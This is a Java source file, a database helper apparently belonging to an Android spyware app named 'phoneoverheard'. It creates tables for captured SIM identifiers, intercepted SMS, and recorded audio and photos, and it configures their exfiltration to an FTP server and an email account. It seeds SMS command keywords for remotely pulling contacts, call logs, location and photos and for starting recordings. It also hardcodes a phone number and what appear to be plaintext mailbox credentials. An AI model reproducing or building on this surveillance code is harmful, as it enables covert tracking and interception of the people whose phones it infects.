package com.phoneoverheard.database;

import java.util.List;

import com.phoneoverheard.phonne.FileService;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.telephony.SmsManager;
import android.util.Log;
public class DatabaseHelper extends SQLiteOpenHelper{
	private static final String TAG = "DBAdapter";
	private static final String DATABASE_NAME = "phonne.db";  //数据库名称  存放位置：./data/phonne.db
	private static final int DATABASE_VERSION = 1;  //数据库版本
	
	//创建数据库，版本号不能为0，建议设为1
	public DatabaseHelper(Context context){
		super(context, DATABASE_NAME, null, DATABASE_VERSION);		
	}
	
	
	//数据库每一次被创建时调用
	@Override
	public void onCreate(SQLiteDatabase db){ 
		//建数据库表
		String smscmd_Sql ="create table smscmd (smskey text not null  primary key, password text not null, telnumber text);";
		db.execSQL(smscmd_Sql); //执行SQL语句，创建短信指令表smscmd
		String manager_Sql ="create table manager (smskey text not null  primary key, password text not null, telnumber text,"
							+" cmdsql text, audiofolder text, imgfolder text,serverport text,serveraddress text,hostip text,"
							+"hostmac text,mailsendto text,mailpassword text,mailfrom text);";
		db.execSQL(manager_Sql); //执行SQL语句，创建管理员信息表manager
		String simmsg_Sql ="create table simmsg (tel text not null, deviceid text, imei text, imsi text,simstate integer);";
		db.execSQL(simmsg_Sql); //执行SQL语句，创建sim卡信息表sim	
		String smsmsg_Sql ="create table smsmsg (read integer, type integer not null, datetime text not null, address text not null, body text not null);";
		db.execSQL(smsmsg_Sql); //执行SQL语句，创建短信息表smsmsg	
		String sendaudio_Sql ="create table sendaudio (sendstate integer, audiosize integer not null, datetime text not null, audiourl text not null, audioname text not null);";
		db.execSQL(sendaudio_Sql); //执行SQL语句，创建录音表sendaudio
		String sendimg_Sql ="create table sendimg (sendstate integer, imgsize integer not null, datetime text not null, imgurl text not null, imgname text not null);";
		db.execSQL(sendimg_Sql); //执行SQL语句，创建照片表sendimg
		//初始化manager表数据
		String password = "888888";
		String telnumber = "15006793699";
    	String ServerPort = "21"; //服务器端口
    	String ServerAddress = "192.168.209.1"; //服务器IP
    	String mailsendto = "ll772874830@163.com";    //收件箱地址
    	String mailpassword = "ll890817";      //发件箱密码
    	String mailfrom = "ll772874830@163.com"; //发件箱地址
		password = new FileService().MD5(password);
		String managerInsert_Sql ="insert into manager values('manager', '"+password+"', '"+telnumber+"', '', '', '','"+ServerPort+"','"+ServerAddress+"','','','"+mailsendto+"','"+mailpassword+"','"+mailfrom+"');";
		db.execSQL(managerInsert_Sql); 
		//初始化smscmd表数据
		String smscmdInsert_Sql1 ="insert into smscmd values('duanxin', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql1); 
		String smscmdInsert_Sql2 ="insert into smscmd values('haoma', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql2); 
		String smscmdInsert_Sql3 ="insert into smscmd values('lianxiren', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql3); 
		String smscmdInsert_Sql4 ="insert into smscmd values('luyin_start', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql4); 
		String smscmdInsert_Sql5 ="insert into smscmd values('luyin_stop', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql5); 
		String smscmdInsert_Sql6 ="insert into smscmd values('tonghuajilu', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql6); 
		String smscmdInsert_Sql7 ="insert into smscmd values('weizhi', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql7); 
		String smscmdInsert_Sql8 ="insert into smscmd values('zhaopian', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql8); 
		String smscmdInsert_Sql9 ="insert into smscmd values('xiazai', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql9); 
		String smscmdInsert_Sql10 ="insert into smscmd values('shenji', '"+password+"', '"+telnumber+"');";
		db.execSQL(smscmdInsert_Sql10); 
	}
	
	//数据库表结构发生变化时,或者添加新表时执行,注意要修改数据库版本号
	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion,int newVersion){
		//db.execSQL("DROP TABLE IF EXISTS mytable");
		Log.v(TAG, "更新数据库版本:"+DATABASE_VERSION);
	}
	
	//执行SQL语句
	public void execSQLCmd(SQLiteDatabase db,String Sql,String sendernumber){
		try{
			db.execSQL(Sql); 
		} catch (Exception e) {
	        // 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "执行Sql语句出错："+Sql;
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
			e.printStackTrace();
		}
	}
	
}
